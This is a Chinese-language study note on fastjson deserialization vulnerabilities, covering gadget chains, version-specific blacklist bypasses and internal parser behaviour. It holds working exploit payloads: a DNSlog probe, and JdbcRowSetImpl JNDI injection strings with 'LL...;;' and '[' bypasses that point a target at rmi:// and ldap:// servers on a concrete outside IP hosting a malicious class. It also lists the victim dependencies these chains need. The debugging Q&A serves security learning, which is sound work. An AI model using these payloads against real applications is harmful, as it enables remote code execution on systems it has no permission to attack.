# fastjson全教程
https://www.rc.sb/fastjson/#fastjson1280
https://y4er.com/posts/fastjson-learn
https://paper.seebug.org/994/
## fastjson1.2.80 poc
https://github.com/YoungBear/FastjsonPoc

# 工具
## fastjson-blacklist(hash解码)
https://github.com/LeadroyaL/fastjson-blacklist

# poc
## dnslog验证
{"x":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}}
## 1.com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
鸡肋
常规的Java字节码的执行，但是需要开启Feature.SupportNonPublicField，比较鸡肋
## 2.com.sun.rowset.JdbcRowSetImpl
出网
用到的是JNDI注入，利用条件相对较低，但是需要连接远程恶意服务器，在目标没外网的情况下无法直接利用
### 低版本jdk-rmi协议
出网
6u132, 7u122, 8u113之前
String poc = "{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;", "dataSourceName":"rmi://47.95.7.37:1099/Calc", "autoCommit":true}";
### 低版本jdk-ldap协议
出网
6u211, 7u201, 8u191, 11.0.1之前
String poc = "{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;", "dataSourceName":"ldap://47.95.7.37:1389/Calc", "autoCommit":true}";
### c3p0
不出网
### 高版本jdk
不出网
开启 TomcatBeanFactoryServer 绑定恶意类到registry, 无需外部获取Factory, 利用本地tomcat依赖中的Factory
String poc = "{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;", "dataSourceName":"rmi://47.95.7.37:1099/Calc", "autoCommit":true}";
受害者本地需要有下面依赖
```text
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-catalina</artifactId>
    <version>8.5.0</version>
</dependency>
```
并且需要如下任选其一作为BeanFactory加载的类, 来执行其中的eval表达式
```text
<dependency>
    <groupId>org.apache.el</groupId>
    <artifactId>com.springsource.org.apache.el</artifactId>
    <version>7.0.26</version>
</dependency>
<dependency>
    <groupId>org.codehaus.groovy</groupId>
    <artifactId>groovy-all</artifactId>
    <version>1.5.0</version>
</dependency>
```
## 3.org.apache.tomcat.dbcp.dbcp2.BasicDataSource(1.2.42poc尝试了)
一个字节码的利用，但其无需目标额外开启选项，也不用连接外部服务器，利用条件更低
受害者本地需要有下面依赖, 并且jdk版本小于8u251, 版本限制是因为过高bcel无法使用
```text
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-dbcp</artifactId>
    <version>9.0.8</version>
</dependency>
```


# 疑问
1.TestDeSerialization中为什么会调用一次getter -> getProp2_2() is called
回答: 特殊的getter:
(1)字段是Map/Collection/AtomicLong/AtomicInteger/AtomicBoolean的子类 -> /com/alibaba/fastjson/util/JavaBeanInfo.java:504
(2)setter返回的类不是getter传入类的父类(基本上有setter又有getter的就无法执行getter了) -> com.alibaba.fastjson.util.JavaBeanInfo.add
(3)item.compareTo(field) < 0

2.为什么parseObject需要Feature.SupportNonPublicField？
没有setter的private为null 我们需要这个来为private赋值

3.为什么需要_outputProperties属性？
反序列化的时候会执行getter方法, 因为_outputProperties是Properties类型是Map的子类 在执行反序列化的时候会执行相应的getter
详见/com/alibaba/fastjson/util/JavaBeanInfo.java:504
并且会执行smartMatch方法去掉_
详见com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.smartMatch()

4._bytecodes为什么需要base64编码？
解析顺序如下:
_bytecodes
_name
_tfactory
_outputProperties

在com.alibaba.fastjson.serializer.ObjectArrayCodec.deserialze 这块执行String to byte[]

具体调用链如下:
deserialze:138, ObjectArrayCodec (com.alibaba.fastjson.serializer) [2]
parseArray:723, DefaultJSONParser (com.alibaba.fastjson.parser)
deserialze:177, ObjectArrayCodec (com.alibaba.fastjson.serializer) [1]
parseField:71, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:137, JSON (com.alibaba.fastjson)
parse:193, JSON (com.alibaba.fastjson)
parseObject:197, JSON (com.alibaba.fastjson)
main:78, FastJson1_LE1224


5._tfactory为什么为{}？
跟踪到这块的时候明明传入的是null, 结果进去就自动生成object了
com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(com.alibaba.fastjson.parser.DefaultJSONParser, java.lang.reflect.Type, java.lang.Object, int)
排除debug本身的问题因为toString和上面那个选项都关掉了 有可能是代码有拦截器 -> FastjsonASMDeserializer_1_TransformerFactoryImpl
找到答案: asm生成类
com.alibaba.fastjson.parser.deserializer.ASMDeserializerFactory.createJavaBeanDeserializer
问题:
尝试学习asm

6.getOutputProperties()
fastjson-1.2.24-sources.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:599

7.a
1.2.43如何调试出使用如下绕过?
{
"@type": "[com.sun.rowset.JdbcRowSetImpl"[{
"dataSourceName": "xxx",
"autoCommit": true
}


# 遇到的问题
多个版本的fastjson存在于External Libraries的时候无法运行调试